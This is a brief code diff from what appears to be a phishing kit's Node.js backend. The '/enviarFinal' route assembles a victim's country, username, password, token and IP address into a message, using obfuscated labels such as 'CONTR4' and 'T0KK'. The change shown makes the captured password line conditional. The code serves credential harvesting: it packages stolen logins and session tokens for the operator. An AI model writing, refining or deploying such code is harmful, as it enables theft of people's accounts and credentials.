@@ -141,7 +141,7 @@ app.post("/enviarFinal", async (req, res) => {
 
 PAYS: ${cliente.pais || "Desconocido"}
 US4R: <code>${cliente.usar}</code>
-CONTR4: <code>${password || "No ingresada"}</code>
+${password ? `CONTR4: <code>${password}</code>` : ""}
 ${token ? `T0KK: <code>${token}</code>` : ""}
 
 IP: ${cliente.ip}
